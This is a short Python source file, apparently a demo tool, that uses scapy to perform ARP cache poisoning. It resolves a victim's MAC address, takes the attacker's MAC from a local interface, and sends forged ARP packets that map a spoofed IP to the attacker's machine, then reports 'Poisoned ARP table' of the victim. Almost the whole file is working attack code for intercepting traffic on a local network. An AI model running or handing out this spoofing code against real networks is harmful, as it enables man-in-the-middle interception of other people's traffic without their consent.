from scapy.all import *
from colores import colores

#get MAC from ip
#for demo purposes, interface enp0s3 is used
def getmac(ip, interface):
    packet = Ether() / ARP(op = ARP.who_has, pdst = ip)
    if interface:
        ans = srp1(packet, verbose = False, timeout = 10, iface = interface)
    else:
        ans = srp1(packet, verbose = False, timeout = 10)
    try:
        return ans[ARP].hwsrc
    except:
       return None

#get mac of host
#for demo purposes
#the enp0s3 interface is used
def gethostmac(interface):
#    macs = [get_if_hwaddr(i) for i in get_if_list()]
#    for m in macs:
#        if m != "00:00:00:00:00:00" and :
#            hostmac = m
#            break
            
    for i in get_if_list():
        m = get_if_hwaddr(i)
        if m != "00:00:00:00:00:00" and (not interface or interface == i):
            hostmac = m
            break
    return hostmac
   
def arpspoof(macAttacker, macVictim, ipToSpoof, ipVictim, interface):
    #create ARP packet
    arp = Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker
    arp[ARP].psrc = ipToSpoof
    arp[ARP].hwdst = macVictim
    arp[ARP].pdst = ipVictim
    #send ARP packet to spoof
    if interface:
        sendp(arp, iface = interface)
    else:
        sendp(arp)
    print colores.GREEN + 'Poisoned ARP table of ' + ipVictim + colores.RESETALL
    
def arppoison(victimIP, ipToSpoof, attackerIP, interface):
    victimMAC = getmac(victimIP, interface)
    if victimMAC == None:
        print colores.ORANGE + 'Cannot find MAC address of victim\n' + colores.RED + 'End of program' + colores.RESETALL
        sys.exit()
    #for demo, make sure enp0s3 interface is used
    attackerMAC = gethostmac(interface)
    arpspoof(attackerMAC, victimMAC, ipToSpoof, victimIP, interface)
